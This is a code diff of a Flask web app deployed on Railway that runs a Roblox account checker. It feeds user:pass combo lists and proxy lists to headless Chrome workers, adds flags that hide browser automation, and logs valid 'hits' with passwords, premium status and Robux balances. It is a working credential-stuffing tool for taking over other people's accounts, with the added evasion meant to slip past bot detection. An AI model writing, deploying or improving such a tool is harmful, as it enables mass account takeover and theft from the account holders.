@@ -1,4 +1,4 @@
-# app.py - Railway Edition with warnings suppressed
+# app.py - Railway Edition for Roblox Account Checker
 
 import os
 import sys
@@ -7,21 +7,13 @@ import time
 import threading
 import queue
 import random
-import warnings
 from datetime import datetime
-
-# Suppress Eventlet deprecation warning
-warnings.filterwarnings("ignore", category=DeprecationWarning)
-warnings.filterwarnings("ignore", category=UserWarning)
-import logging
-logging.getLogger('eventlet').setLevel(logging.ERROR)
-
 from flask import Flask, render_template, request, jsonify
 from flask_cors import CORS
 from flask_socketio import SocketIO, emit
 
 # ============================================================
-# RAILWAY CHROME FIX
+# RAILWAY CHROME FIX - MUST BE BEFORE IMPORTING wf.py
 # ============================================================
 os.environ['CHROME_BIN'] = '/usr/bin/google-chrome'
 os.environ['CHROMEDRIVER_PATH'] = '/usr/bin/chromedriver'
@@ -37,7 +29,7 @@ except ImportError as e:
     sys.exit(1)
 
 # ============================================================
-# PATCH DRIVER MANAGER FOR RAILWAY
+# PATCH DRIVER MANAGER FOR RAILWAY (wf.py stays untouched)
 # ============================================================
 try:
     from selenium import webdriver
@@ -46,34 +38,99 @@ try:
     from wf import DriverManager
     
     def railway_create_driver(self, proxy=None, worker_id=0):
+        """Railway-compatible driver creation"""
         try:
             print(f"[DRIVER] Creating driver for worker {worker_id}")
             
             options = Options()
-            options.add_argument("--headless=new")
-            options.add_argument("--no-sandbox")
-            options.add_argument("--disable-dev-shm-usage")
-            options.add_argument("--disable-gpu")
-            options.add_argument("--window-size=1920,1080")
-            options.add_argument("--disable-blink-features=AutomationControlled")
+            
+            # Headless options for Railway
+            base_args = [
+                "--headless=new",
+                "--disable-gpu",
+                "--window-size=1920,1080",
+                "--disable-blink-features=AutomationControlled",
+                "--disable-dev-shm-usage",
+                "--no-sandbox",
+                "--disable-setuid-sandbox",
+                "--remote-debugging-port=9222",
+                "--user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+                "--log-level=3",
+                "--disable-web-security",
+                "--disable-features=IsolateOrigins,site-per-process",
+                "--disable-extensions",
+                "--disable-plugins",
+                "--ignore-certificate-errors",
+                "--disable-crash-reporter",
+                "--disable-notifications",
+                "--disable-popup-blocking",
+                "--disable-infobars",
+                "--disable-background-timer-throttling",
+                "--disable-backgrounding-occluded-windows",
+                "--disable-renderer-backgrounding",
+                "--disable-ipc-flooding-protection",
+                "--disable-hang-monitor"
+            ]
+            
+            for arg in base_args:
+                options.add_argument(arg)
+            
             options.add_experimental_option("excludeSwitches", ["enable-automation"])
             options.add_experimental_option('useAutomationExtension', False)
             
+            # Set Chrome binary for Railway
             chrome_bin = '/usr/bin/google-chrome'
             if os.path.exists(chrome_bin):
                 options.binary_location = chrome_bin
+                print(f"[DRIVER] Using Chrome: {chrome_bin}")
+            else:
+                print(f"[DRIVER] Chrome not found at {chrome_bin}")
+                # Try to find Chrome
+                try:
+                    import subprocess
+                    result = subprocess.run(['which', 'google-chrome'], capture_output=True, text=True)
+                    if result.stdout:
+                        chrome_bin = result.stdout.strip()
+                        options.binary_location = chrome_bin
+                        print(f"[DRIVER] Found Chrome at: {chrome_bin}")
+                except:
+                    pass
             
             if proxy:
                 options.add_argument(f'--proxy-server={proxy}')
             
+            # Preferences
+            prefs = {
+                "credentials_enable_service": False,
+                "profile.password_manager_enabled": False,
+                "profile.default_content_setting_values.notifications": 2,
+                "intl.accept_languages": "en-US,en",
+            }
+            options.add_experimental_option("prefs", prefs)
+            
+            # Set ChromeDriver for Railway
             chromedriver_path = '/usr/bin/chromedriver'
             if os.path.exists(chromedriver_path):
                 service = Service(executable_path=chromedriver_path)
+                print(f"[DRIVER] Using ChromeDriver: {chromedriver_path}")
             else:
-                service = Service()
+                print(f"[DRIVER] ChromeDriver not found at {chromedriver_path}")
+                # Try to find ChromeDriver
+                try:
+                    import subprocess
+                    result = subprocess.run(['which', 'chromedriver'], capture_output=True, text=True)
+                    if result.stdout:
+                        chromedriver_path = result.stdout.strip()
+                        service = Service(executable_path=chromedriver_path)
+                        print(f"[DRIVER] Found ChromeDriver at: {chromedriver_path}")
+                    else:
+                        service = Service()
+                except:
+                    service = Service()
             
             driver = webdriver.Chrome(service=service, options=options)
             driver.set_page_load_timeout(30)
+            driver.set_script_timeout(30)
             
             driver_id = f"worker_{worker_id}"
             self.active_drivers[driver_id] = driver
@@ -86,6 +143,7 @@ try:
             print(f"[DRIVER] ❌ Failed: {e}")
             return None
     
+    # Apply the patch
     DriverManager.create_driver = railway_create_driver
     print("[+] ✅ Patched DriverManager for Railway")
     
@@ -98,8 +156,16 @@ except Exception as e:
 app = Flask(__name__)
 CORS(app)
 
-# Use threading mode to avoid Eventlet warnings
-socketio = SocketIO(app, cors_allowed_origins="*", async_mode='threading')
+# SocketIO - Railway optimized
+socketio = SocketIO(
+    app,
+    cors_allowed_origins="*",
+    async_mode='eventlet',
+    ping_timeout=60,
+    ping_interval=25,
+    logger=False,
+    engineio_logger=False
+)
 
 # Global state
 checker_state = {
@@ -133,8 +199,11 @@ checker_state = {
 
 checker = None
 work_queue = queue.Queue()
+running = False
+paused = False
 
 def add_log(message, level='info'):
+    """Add a log entry"""
     log_entry = {
         'time': datetime.now().strftime('%H:%M:%S'),
         'message': message,
@@ -172,7 +241,7 @@ def get_status():
 
 @app.route('/api/start', methods=['POST'])
 def start_checker():
-    global checker, work_queue
+    global checker, running, paused, work_queue
     
     if checker_state['running']:
         return jsonify({'error': 'Checker already running'}), 400
@@ -187,6 +256,7 @@ def start_checker():
     if not combo_text:
         return jsonify({'error': 'No accounts provided'}), 400
     
+    # Parse accounts
     accounts = []
     for line in combo_text.strip().split('\n'):
         line = line.strip()
@@ -201,6 +271,7 @@ def start_checker():
     if not accounts:
         return jsonify({'error': 'No valid accounts found (format: user:pass)'}), 400
     
+    # Parse proxies
     proxies = []
     if proxy_text:
         for line in proxy_text.strip().split('\n'):
@@ -208,18 +279,22 @@ def start_checker():
             if line and not line.startswith('#'):
                 proxies.append(line)
     
+    # Create checker instance with the original AntraxRblxChecker
     checker = AntraxRblxChecker()
     checker.accounts = accounts
     checker.min_delay = min_delay
     checker.max_delay = max_delay
+    # Limit threads for Railway (memory constraints)
     max_workers = min(threads, 5)
     checker.max_workers = max_workers
     checker.max_accounts_per_test = len(accounts)
     
+    # Add proxies if provided
     if proxies:
         checker.proxy_manager.proxies = proxies
         checker.proxy_manager.active_proxies = proxies.copy()
     
+    # Reset state
     checker_state['running'] = True
     checker_state['paused'] = False
     checker_state['accounts'] = accounts
@@ -246,6 +321,7 @@ def start_checker():
     }
     checker_state['total_accounts'] = len(accounts)
     
+    # Start worker threads
     work_queue = queue.Queue()
     for account in accounts:
         work_queue.put(account)
@@ -258,11 +334,12 @@ def start_checker():
         )
         w.start()
     
+    # Start monitoring thread
     monitor_thread = threading.Thread(target=monitor_progress, args=(len(accounts),), daemon=True)
     monitor_thread.start()
     
     add_log(f'🚀 Checker started with {len(accounts)} accounts and {len(proxies)} proxies', 'success')
-    add_log(f'⚙️ Using {max_workers} workers', 'info')
+    add_log(f'⚙️ Using {max_workers} workers (limited for Railway)', 'info')
     
     return jsonify({
         'success': True,
@@ -271,8 +348,10 @@ def start_checker():
     })
 
 def checker_worker(worker_id, work_queue):
+    """Worker thread using the original checker"""
     while checker_state['running'] and not work_queue.empty():
         try:
+            # Check if paused
             while checker_state['paused'] and checker_state['running']:
                 time.sleep(0.5)
             
@@ -282,11 +361,14 @@ def checker_worker(worker_id, work_queue):
             account = work_queue.get_nowait()
             checker_state['current_account'] = account.username
             
+            # Use the original verify_account method
             verified_account = checker.verify_account(account, worker_id)
             
+            # Update stats
             stats = checker_state['stats']
             stats['verified'] += 1
             
+            # Map status to stats
             status_map = {
                 'valid': 'valid',
                 'invalid_password': 'wrong_password',
@@ -300,6 +382,7 @@ def checker_worker(worker_id, work_queue):
             if verified_account.status in status_map:
                 stats[status_map[verified_account.status]] += 1
             
+            # Check if valid
             if verified_account.status == 'valid':
                 stats['valid'] += 1
                 if verified_account.premium:
@@ -307,6 +390,7 @@ def checker_worker(worker_id, work_queue):
                 if verified_account.robux > 0:
                     stats['total_robux'] += verified_account.robux
                 
+                # Store hit
                 hit_data = {
                     'username': verified_account.username,
                     'password': verified_account.password,
@@ -321,8 +405,10 @@ def checker_worker(worker_id, work_queue):
                     'time': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                 }
                 checker_state['hits'].append(hit_data)
+                # Emit hit event for immediate display
                 emit_socket_event('hit', hit_data)
             
+            # Add to recent results
             result_line = {
                 'worker': worker_id,
                 'status': verified_account.status,
@@ -335,8 +421,10 @@ def checker_worker(worker_id, work_queue):
             if len(checker_state['recent_results']) > 50:
                 checker_state['recent_results'].pop(0)
             
+            # Emit update
             emit_socket_event('update', result_line)
             
+            # Add log
             if verified_account.status == 'valid':
                 premium_tag = ' [PREMIUM]' if verified_account.premium else ''
                 robux_tag = f' | R${verified_account.robux:,}' if verified_account.robux > 0 else ''
@@ -351,6 +439,7 @@ def checker_worker(worker_id, work_queue):
                     status_emoji = '⏰'
                 add_log(f'{status_emoji} Worker {worker_id}: {verified_account.username} - {verified_account.message}', 'info')
             
+            # Delay between checks
             if checker_state['running']:
                 delay = random.uniform(checker.min_delay, checker.max_delay)
                 time.sleep(delay)
@@ -364,6 +453,7 @@ def checker_worker(worker_id, work_queue):
             work_queue.task_done()
 
 def monitor_progress(total):
+    """Monitor and emit progress updates"""
     while checker_state['running']:
         try:
             stats = checker_state['stats']
@@ -451,6 +541,7 @@ def handle_disconnect():
     add_log('📡 Client disconnected', 'info')
 
 if __name__ == '__main__':
+    # Get port from environment variable (Railway sets this)
     port = int(os.environ.get('PORT', 8080))
     
     print("[+] ✅ Successfully loaded AntraxRblxChecker from wf.py")
@@ -458,12 +549,22 @@ if __name__ == '__main__':
     print(f"[+] 🌐 Running on port {port}")
     print("[+] 📊 Using original AntraxRblxChecker engine")
     print("[+] ⚡ Railway-optimized configuration")
-    print("[+] 🔇 Eventlet warnings suppressed")
     
-    socketio.run(
-        app,
-        host='0.0.0.0',
-        port=port,
-        debug=False,
-        use_reloader=False
-    )
+    # Run with eventlet for production
+    try:
+        socketio.run(
+            app,
+            host='0.0.0.0',
+            port=port,
+            debug=False,
+            use_reloader=False,
+            log_output=False
+        )
+    except TypeError:
+        socketio.run(
+            app,
+            host='0.0.0.0',
+            port=port,
+            debug=False,
+            use_reloader=False
+        )
